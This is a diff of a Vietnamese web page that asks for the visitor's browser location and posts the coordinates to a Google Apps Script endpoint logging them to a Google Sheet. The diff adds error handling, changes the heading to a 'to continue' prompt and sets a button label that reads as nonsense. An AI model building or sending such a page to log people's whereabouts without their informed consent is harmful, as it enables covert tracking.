@@ -4,14 +4,14 @@
   <title>Lấy vị trí</title>
 </head>
 <body>
-  <h2>Vui lòng cho phép truy cập vị trí</h2>
-  <button onclick="getLocation()">Gửi vị trí</button>
+  <h2>Vui lòng cho phép truy cập vị trí để tiếp tục</h2>
+  <button onclick="getLocation()">Tâm lỏ chìa</button>
   <p id="output"></p>
 
   <script>
     function getLocation() {
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendPosition);
+        navigator.geolocation.getCurrentPosition(sendPosition, showError);
       } else {
         document.getElementById("output").innerText = "Trình duyệt không hỗ trợ định vị.";
       }
@@ -21,9 +21,8 @@
       let lat = position.coords.latitude;
       let lon = position.coords.longitude;
 
-      // Gửi dữ liệu về Google Sheet thông qua Apps Script
-      fetch("https://script.google.com/macros/s/AKfycbwxB_l4yFtkK7f_1onxuAT47LgFurWIWQ7VCkLKet1ybFlFLDSAThEA6eSn965Dg1EkQA/exec
-", {
+      // Gửi dữ liệu về Google Sheet
+      fetch("https://script.google.com/macros/s/AKfycbwxB_l4yFtkK7f_1onxuAT47LgFurWIWQ7VCkLKet1ybFlFLDSAThEA6eSn965Dg1EkQA/exec", {
         method: "POST",
         body: JSON.stringify({ lat: lat, lon: lon }),
         headers: { "Content-Type": "application/json" }
@@ -32,8 +31,26 @@
         document.getElementById("output").innerHTML =
           `✅ Đã gửi! <a href="${link}" target="_blank">Xem trên bản đồ</a>`;
       }).catch(error => {
-        document.getElementById("output").innerText = "❌ Lỗi khi gửi dữ liệu!";
+        document.getElementById("output").innerText = "❌ Lỗi gửi dữ liệu!";
+        console.error("Gửi thất bại:", error);
       });
+    }
+
+    function showError(error) {
+      switch(error.code) {
+        case error.PERMISSION_DENIED:
+          document.getElementById("output").innerText = "Bạn đã từ chối truy cập vị trí.";
+          break;
+        case error.POSITION_UNAVAILABLE:
+          document.getElementById("output").innerText = "Không thể xác định vị trí.";
+          break;
+        case error.TIMEOUT:
+          document.getElementById("output").innerText = "Yêu cầu định vị bị hết thời gian.";
+          break;
+        default:
+          document.getElementById("output").innerText = "Lỗi không xác định.";
+          break;
+      }
     }
   </script>
 </body>
